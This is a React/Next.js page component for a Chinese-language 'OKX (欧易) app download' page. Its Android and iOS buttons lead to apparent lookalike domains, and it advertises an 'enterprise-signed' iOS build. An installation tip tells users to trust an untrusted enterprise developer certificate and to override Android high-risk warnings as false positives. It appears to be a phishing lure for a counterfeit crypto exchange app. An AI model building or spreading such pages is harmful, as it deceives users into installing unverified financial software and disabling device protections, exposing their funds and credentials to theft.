import React from 'react';
import { Smartphone, Apple, Check, ShieldCheck } from 'lucide-react';
import { Button } from '@/components/ui/Button';
import type { Metadata } from 'next';

export const metadata: Metadata = {
    title: '欧易 APP 下载 | 欧易 OKX 手机版',
    description: '随时随地，掌控全球加密市场。欧易 App 完美适配 iOS 与 Android 双系统，融合了币币交易、合约交易、Web3 钱包及理财功能。',
};

export default function AppPage() {
    return (
        <div className="min-h-screen pt-32 pb-20 px-6 flex flex-col items-center bg-black">
            <div className="max-w-5xl w-full">
                <div className="text-center mb-20 animate-fade-in">
                    <h1 className="text-5xl md:text-7xl font-bold text-white mb-6 tracking-tight">
                        欧易APP下载
                    </h1>
                    <p className="text-zinc-400 text-xl max-w-3xl mx-auto">
                        随时随地，掌控全球加密市场。欧易 App 完美适配 iOS 与 Android 双系统，融合了币币交易、合约交易、Web3 钱包及理财功能。全新升级的 UI 设计与底层架构，为您提供丝般顺滑的操作体验与银行级的安全防护，让您不错过任何一次行情波动。
                    </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-24">
                    {/* Android Card */}
                    <div className="group relative bg-zinc-900/30 border border-zinc-800 rounded-2xl p-8 hover:bg-zinc-900/50 hover:border-zinc-600 transition-all duration-300">
                        <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
                            <Smartphone className="w-32 h-32 text-white rotate-12" />
                        </div>

                        <div className="relative z-10">
                            <div className="w-12 h-12 bg-green-500/20 rounded-xl flex items-center justify-center mb-6">
                                <Smartphone className="w-6 h-6 text-green-400" />
                            </div>
                            <h2 className="text-2xl font-bold text-white mb-2">Android 安装包</h2>
                            <p className="text-zinc-500 text-sm mb-8">适用于所有安卓设备 (Samsung, Xiaomi, Huawei, etc.) • 官方正版</p>

                            <div className="mb-8">
                                {/* Domain removed */}
                            </div>

                            <Button href="https://ouyi26.app" target="_blank" className="w-full justify-center text-base py-4 bg-white text-black hover:bg-zinc-200 font-bold rounded-xl shadow-lg shadow-green-900/20">
                                下载安卓版
                            </Button>
                        </div>
                    </div>

                    {/* iOS Card */}
                    <div className="group relative bg-zinc-900/30 border border-zinc-800 rounded-2xl p-8 hover:bg-zinc-900/50 hover:border-zinc-600 transition-all duration-300">
                        <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
                            <Apple className="w-32 h-32 text-white rotate-12" />
                        </div>

                        <div className="relative z-10">
                            <div className="w-12 h-12 bg-white/10 rounded-xl flex items-center justify-center mb-6">
                                <Apple className="w-6 h-6 text-white" />
                            </div>
                            <h2 className="text-2xl font-bold text-white mb-2">iOS 企业版</h2>
                            <p className="text-zinc-500 text-sm mb-8">无需 Apple ID • 稳定签名 • 自动更新</p>

                            <div className="mb-8">
                                {/* Domain removed */}
                            </div>

                            <Button href="https://okx26.app" target="_blank" variant="outline" className="w-full justify-center text-base py-4 rounded-xl border-zinc-600 hover:border-white hover:text-white">
                                下载 iOS 版
                            </Button>
                        </div>
                    </div>
                </div>

                {/* Feature List */}
                <div className="border-t border-zinc-900/50 pt-16">
                    <h3 className="text-2xl font-bold text-white mb-10 text-center">App 核心功能亮点</h3>
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-8">
                        {[
                            { title: '极速行情推送', desc: '采用自研的长连接推送技术，实现毫秒级行情刷新。您可以设置自定义价格预警，当市场达到指定点位时，系统将第一时间通过 App 推送通知您，助您把握先机。' },
                            { title: '内置 Web3 钱包', desc: '无需切换应用，App 内置去中心化 Web3 钱包。支持异构多链资产管理，集成 DApp 浏览器，让您可以直接在手机上探索 NFT 市场、参与 DeFi 流动性挖矿。' },
                            { title: '多重安全防护', desc: '支持 Face ID / Touch ID 生物识别登录，本地数据采用 AES-256 标准加密存储。提币环节增加人脸识别与多重验证，全方位保障您的资金安全。' },
                        ].map((item, i) => (
                            <div key={i} className="flex gap-4 p-4 rounded-xl hover:bg-zinc-900/30 transition-colors">
                                <div className="w-6 h-6 bg-blue-600/20 rounded-full flex items-center justify-center shrink-0 mt-1">
                                    <Check className="w-3 h-3 text-blue-400" />
                                </div>
                                <div>
                                    <h4 className="text-white font-bold mb-2">{item.title}</h4>
                                    <p className="text-zinc-500 text-sm leading-relaxed text-justify">{item.desc}</p>
                                </div>
                            </div>
                        ))}
                    </div>

                    <div className="mt-12 bg-zinc-900/40 p-6 rounded-xl border border-zinc-800 flex gap-4 items-start">
                        <ShieldCheck className="w-5 h-5 text-zinc-400 shrink-0 mt-0.5" />
                        <div>
                            <h4 className="text-white font-medium text-sm mb-1">安装小贴士</h4>
                            <p className="text-zinc-500 text-xs leading-relaxed">
                                iOS 用户下载企业版后，若首次打开提示“未受信任的企业级开发者”，请前往 iPhone 设置 - 通用 - VPN与设备管理中，找到对应的证书并点击信任。Android 用户若在安装时被手机系统拦截（如提示高风险），请选择“允许安装”或“解除管控”，这是因为区块链类应用未上架部分应用商店导致的误报，请放心使用。
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
